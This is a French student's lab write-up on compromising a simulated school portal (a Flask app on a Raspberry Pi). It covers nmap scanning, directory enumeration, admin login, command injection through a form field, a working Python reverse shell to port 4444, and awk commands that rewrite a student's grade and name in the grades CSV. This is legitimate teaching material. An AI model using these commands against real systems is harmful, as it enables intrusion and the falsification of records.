# TP_BTS – Compte rendu du TP – Reverse shell sur l’ENT Ingetis

## Introduction

Ce TP avait pour objectif d’analyser et d’exploiter une application web Flask simulant un ENT Ingetis, hébergée sur un Raspberry Pi, afin d’obtenir un accès système (reverse shell) et de modifier une note dans un fichier CSV.

Mon poste de travail tournait sous Arch Linux avec l’adresse IP `172.16.2.40`, et la machine cible (Raspberry Pi) avait l’adresse IP `172.16.1.45`.

---

## 1. Découverte du réseau et de la cible

### 1.1 Identification de mon réseau local

Pour commencer, j’ai affiché la configuration réseau de ma machine afin d’identifier mon IP et la plage réseau utilisée.

```bash
ip a
```

Cette commande m’a permis de voir que mon interface `wlan0` possédait l’adresse IP `172.16.2.40/12`, ce qui indique une plage de réseau très large (172.16.0.0 à 172.31.255.255).

### 1.2 Mauvaise utilisation initiale de nmap (échec)

J’ai d’abord tenté un scan avec une mauvaise option :

```bash
sudo nmap -sp 172.16.2.40
```

Nmap a renvoyé une erreur car l’option `-sp` n’existe pas pour un ping scan, l’option correcte est `-sn`.

### 1.3 Scan ping large pour trouver la Raspberry (succès mais inefficace)

```bash
sudo nmap -sn 172.16.0.0/12
```

Le scan a été très long, mais il a finalement listé de nombreuses machines, dont la Raspberry Pi identifiée par son adresse MAC “Raspberry Pi Trading” et l’IP `172.16.1.45`.

---

## 2. Scan de ports et identification des services

```bash
sudo nmap -sV -p- 172.16.1.45
```

Résultat important :

```
22/tcp open ssh (OpenSSH 9.4p1 Debian)
7552/tcp open http (Werkzeug httpd 2.3.7 / Python 3.11.6)
```

L’ENT est donc accessible via HTTP sur le port 7552 :  
`http://172.16.1.45:7552/`

---

## 3. Énumération des répertoires de l’application web

### 3.1 Tentatives avec dirsearch et curl (échecs)

```bash
dirsearch -u http://172.16.1.45:7552 -e html,php,txt,js
# → zsh: command not found: dirsearch

curl -I http://172.16.1.45:7552/login
# → zsh: command not found: curl
```

Ces commandes ont échoué car les outils n’étaient pas installés sur l’Arch Linux.

### 3.2 Scan avec Nuclei (succès partiel)

```bash
nuclei -u http://172.16.1.45:7552
```

Nuclei a détecté que le serveur utilisait Python/Werkzeug, mais n’a pas trouvé directement la page de login/admin.

### 3.3 Script d’énumération avec wget (succès)

```bash
#!/bin/bash
TARGET="http://172.16.1.45:7552"
WORDLIST="/tmp/common.txt"
OUTPUT="scan_result.txt"

echo "[*] Téléchargement de la wordlist…"
wget -qO- https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt > "$WORDLIST"

echo "[*] Scan en cours sur $TARGET …"
echo "Résultats du scan pour $TARGET" > "$OUTPUT"
echo "-------------------------------------------" >> "$OUTPUT"

while read -r p; do
    RESULT=$(wget -S --spider "$TARGET/$p" 2>&1 | grep "HTTP/")
    if [[ ! -z "$RESULT" ]]; then
        echo "[FOUND] $p => $RESULT"
        echo "[FOUND] $p => $RESULT" >> "$OUTPUT"
    fi
done < "$WORDLIST"

echo "[*] Scan terminé. Résultats dans : $OUTPUT"
```

Résultats obtenus :

```
[FOUND] doc       => HTTP/1.1 200 OK
[FOUND] login     => HTTP/1.1 200 OK
[FOUND] static    => HTTP/1.1 200 OK
[FOUND] templates => HTTP/1.1 200 OK
```

---

## 4. Accès à la page de login et interface admin

### 4.1 Construction et test de l’URL de login

URL testée :  
`http://172.16.1.45:7552/login`

Identifiants utilisés :

```
username = admin_ingetis
password = admin_pass_ingetis
```

Connexion réussie à l’interface d’administration.

### 4.2 Récupération du HTML de la page admin

```bash
curl 'http://172.16.1.45:7552/login' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=admin_ingetis&password=admin_pass_ingetis'
```

La page contient un formulaire avec `name="command"` et un tableau de notes des étudiants.

---

## 5. Découverte du CSV des notes via /doc et commandes système

### 5.1 Accès à la documentation /doc

URL : `http://172.16.1.45:7552/doc`

### 5.2 Lecture du CSV via le champ command

```bash
cat doc/liste_etudiants.csv
```

Extrait du CSV :

```
nom;prénom;moyenne_generale
BTS CIEL;ABDELMALEK Walid;9.09
BTS CIEL;JOBLON Keran;9.18
BTS CIEL;THIBAULT Aymeric;n'attend que des 20 dans cette colonne
```

---

## 6. Reverse shell sur le Raspberry

### 6.1 Choix des IP et du port

- Machine attaquante : `172.16.2.40`  
- Machine cible : `172.16.1.45`  
- Port choisi : `4444`

### 6.2 Mise en écoute sur ma machine

```bash
ncat -lvnp 4444
# ou
nc -lvnp 4444
```

### 6.3 Reverse shell Python exécuté sur le Raspberry

```python
import socket, os, pty
s = socket.socket()
s.connect(("172.16.2.40", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/sh")
```

---

## 7. Navigation sur le système cible et localisation du CSV

```bash
cd doc
ls
cat liste_etudiants.csv
```

Résultat : confirme la présence de `BTS CIEL;JOBLON Keran;9.18`.

---

## 8. Tentatives de modification de la note

### 8.1 Avec sed (échec)

```bash
sed -i 's/9.18/20/' liste_etudiants.csv
grep "JOBLON Keran" liste_etudiants.csv
```

### 8.2 Redirections simples (échec)

```bash
echo "test" > test.txt
cat liste_etudiants.csv | sed 's/9.18/20/' > new.csv
```

### 8.3 Python multi-lignes dans le champ command (échec)

```bash
python3 - << 'EOF'
import csv
...
EOF
```

---

## 9. Solution fonctionnelle avec awk

### 9.2 Commande awk finale par motif (succès)

```bash
awk -F';' 'BEGIN{OFS=";"} /JOBLON Keran/ {$3="20"} {print}' liste_etudiants.csv > tmp.csv && mv tmp.csv liste_etudiants.csv
```

Vérification :

```bash
grep "JOBLON Keran" liste_etudiants.csv
# Résultat : BTS CIEL;JOBLON Keran;20
```

### 9.3 Modification du nom

```bash
awk -F';' 'BEGIN{OFS=";"} /JOBLON Keran/ {$2="Dictateur"} {print}' liste_etudiants.csv > tmp.csv && mv tmp.csv liste_etudiants.csv
```

Vérification :

```bash
grep "Dictateur" liste_etudiants.csv
# Résultat : BTS CIEL;Dictateur;20
```

---

## 10. Vérification finale dans l’ENT

Après modification du CSV côté serveur, rechargement de la page de l’ENT confirme que les modifications sont visibles.

---

## 11. Limites rencontrées

- Nano peu confortable en reverse shell.  
- `sed -i` et certaines redirections `>` ne fonctionnaient pas.  
- Scripts Python multi-lignes non supportés dans le champ command.  

---

## 12. Récapitulatif des commandes clés

### 12.1 Commandes qui ont fonctionné

```bash
ip a
sudo nmap -sn 172.16.0.0/12
sudo nmap -sV -p- 172.16.1.45
./scan_pages.sh
ncat -lvnp 4444
import socket,os,pty
s=socket.socket()
s.connect(("172.16.2.40",4444))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
cd doc
ls
cat liste_etudiants.csv
awk -F';' 'BEGIN{OFS=";"} /JOBLON Keran/ {$3="20"} {print}' liste_etudiants.csv > tmp.csv && mv tmp.csv liste_etudiants.csv
awk -F';' 'BEGIN{OFS=";"} /JOBLON Keran/ {$2="Dictateur"} {print}' liste_etudiants.csv > tmp.csv && mv tmp.csv liste_etudiants.csv
```

### 12.2 Commandes qui n’ont pas fonctionné et pourquoi

```bash
sudo nmap -sp 172.16.2.40
dirsearch -u http://172.16.1.45:7552 -e html,php,txt,js
curl -I http://172.16.1.45:7552/login
sed -i 's/9.18/20/' liste_etudiants.csv
sed -i 's;9.18;20;' liste_etudiants.csv
python3 - << 'EOF'
import csv
...
EOF
echo "test" > doc/test.txt
cat doc/liste_etudiants.csv | sed 's/9.18/20/' > doc/new.csv
```

---

## Conclusion

Le TP a permis de suivre toute la chaîne :

- Reconnaissance réseau (nmap)  
- Énumération des routes Flask (/doc, /login, /static, /templates)  
- Connexion admin et exploitation d’un champ command pour reverse shell  
- Navigation et modification du fichier CSV via awk  
- Vérification finale dans l’ENT  

Même si l’édition interactive était limitée, l’usage d’outils en ligne de commande a permis d’atteindre l’objectif du TP avec succès.
